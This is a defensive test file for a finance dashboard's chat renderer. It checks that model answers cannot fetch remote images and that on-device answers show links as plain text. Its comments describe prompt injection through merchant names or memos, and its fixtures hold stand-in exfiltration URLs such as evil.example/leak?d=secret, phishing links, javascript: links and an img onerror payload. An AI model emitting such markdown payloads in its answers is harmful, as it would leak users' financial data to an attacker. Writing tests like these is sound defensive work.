import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { renderChatMarkdownHtml, renderLocalChatMarkdownHtml } from '../dashboard/ui/src/lib/chatMarkdown.html.js';
import { isLocalProvenance } from '../dashboard/ui/src/hybrid/core.js';

/**
 * DECISIONS Q12 / spec C10: chat answers are rendered with react-markdown, and
 * an image in a model answer (for example one steered by injected merchant
 * text: `![](https://evil.example/leak?d=...)`) would make the BROWSER fetch
 * that URL the moment the answer renders. The ChatTab component map therefore
 * overrides `img` so no <img>, <picture>, <source> or url() is ever emitted.
 */

const render = renderChatMarkdownHtml;

describe('ChatTab markdown: no remote image is fetched on render', () => {
  test('a markdown image renders no <img> and no URL at all', () => {
    const html = render('Here you go ![chart](https://evil.example/leak?d=secret) done');
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toContain('evil.example');
    expect(html).not.toContain('src=');
    // The alt text is kept as plain text so the reader still sees what was there.
    expect(html).toContain('chart');
    expect(html).toContain('done');
  });

  test('empty alt, data: URIs, protocol-relative and relative sources are all dropped', () => {
    for (const src of ['https://evil.example/a.png', '//evil.example/a.png', '/api/secret.png', 'data:image/svg+xml;base64,PHN2Zz4=', 'http://127.0.0.1:3141/api/transactions']) {
      const html = render(`![](${src})`);
      expect(html, src).not.toMatch(/<img/i);
      expect(html, src).not.toContain('evil.example');
      expect(html, src).not.toContain('src=');
      expect(html, src).not.toContain('data:image');
    }
  });

  test('a reference-style image and an image inside a link are also dropped', () => {
    const ref = render('![x][r]\n\n[r]: https://evil.example/x.png');
    expect(ref).not.toMatch(/<img/i);
    expect(ref).not.toContain('evil.example/x.png');
    const linked = render('[![x](https://evil.example/i.png)](https://example.com/page)');
    expect(linked).not.toMatch(/<img/i);
    expect(linked).not.toContain('evil.example/i.png');
  });

  test('raw HTML stays escaped (no rehype-raw), so an inline <img> is text, not an element', () => {
    const html = render('<img src="https://evil.example/raw.png" onerror="x()">');
    expect(html).not.toMatch(/<img/i);
  });

  test('links and ordinary markdown still render', () => {
    const html = render('**bold** and [a link](https://example.com)\n\n| a | b |\n|---|---|\n| 1 | 2 |');
    expect(html).toContain('<strong');
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('<table');
  });
});

describe('ChatTab renders assistant text only through the guarded component', () => {
  const src = readFileSync(new URL('../dashboard/ui/src/tabs/ChatTab.tsx', import.meta.url), 'utf8');

  test('uses ChatMarkdown and never a bare ReactMarkdown (which would bypass the img override)', () => {
    expect(src).toContain("from '@/lib/chatMarkdown'");
    expect(src).toContain('<ChatMarkdown>');
    expect(src).not.toContain('<ReactMarkdown');
    expect(src).not.toContain('rehype-raw');
  });
});

/**
 * Round 2: an on-device answer is composed by a 0.6B model from tool results that
 * can carry attacker-controlled text (a merchant name, a memo). A link in it must
 * never be clickable, so local answers render links as inert text. Server answers
 * keep working links (the server agent is the trusted path).
 */
describe('ChatTab markdown: links in on-device answers are plain text', () => {
  const evil = 'See [your statement](https://evil.example/phish?d=1) or https://evil.example/auto now';

  test('local answers: no <a>, no href, no destination URL; the label stays as text', () => {
    const html = renderLocalChatMarkdownHtml(evil);
    expect(html).not.toMatch(/<a[\s>]/i);
    expect(html).not.toContain('href');
    // The hidden destination of a labelled link is dropped...
    expect(html).not.toContain('phish');
    expect(html).toContain('your statement');
    // ...and a bare URL survives only as inert text (it is its own label).
    expect(html).toContain('https://evil.example/auto');
  });

  test('local answers: reference-style links, links wrapping an image and mailto/javascript links are inert too', () => {
    for (const md of [
      '[x][r]\n\n[r]: https://evil.example/ref',
      '[![alt](https://evil.example/i.png)](https://evil.example/page)',
      '[mail](mailto:a@evil.example)',
      '[js](javascript:alert(1))',
      '<https://evil.example/angle>',
    ]) {
      const html = renderLocalChatMarkdownHtml(md);
      expect(html, md).not.toMatch(/<a[\s>]/i);
      expect(html, md).not.toContain('href');
      expect(html, md).not.toMatch(/<img/i);
    }
  });

  test('local answers still render the rest of the markdown', () => {
    const html = renderLocalChatMarkdownHtml('**bold** [l](https://example.com)\n\n| a | b |\n|---|---|\n| 1 | 2 |');
    expect(html).toContain('<strong');
    expect(html).toContain('<table');
  });

  test('server answers are unchanged: the same text keeps working links', () => {
    const html = render(evil);
    expect(html).toContain('href="https://evil.example/phish?d=1"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  test('isLocalProvenance is true for exactly the two on-device provenances', () => {
    expect(isLocalProvenance('local-with-context')).toBe(true);
    expect(isLocalProvenance('local-tools')).toBe(true);
    for (const p of ['server-continued', 'server-fallback', 'unavailable', undefined] as const) {
      expect(isLocalProvenance(p)).toBe(false);
    }
  });

  test('ChatTab picks the renderer from the message provenance or history flag, not from message text', () => {
    const tab = readFileSync(new URL('../dashboard/ui/src/tabs/ChatTab.tsx', import.meta.url), 'utf8');
    expect(tab).toContain("import { ChatMarkdown, LocalChatMarkdown } from '@/lib/chatMarkdown'");
    expect(tab).toMatch(/linksRenderAsText\(msg\)\s*\?\s*\(?\s*(\/\/[^\n]*\n\s*)?<LocalChatMarkdown>\{msg\.content\}<\/LocalChatMarkdown>/);
  });
});
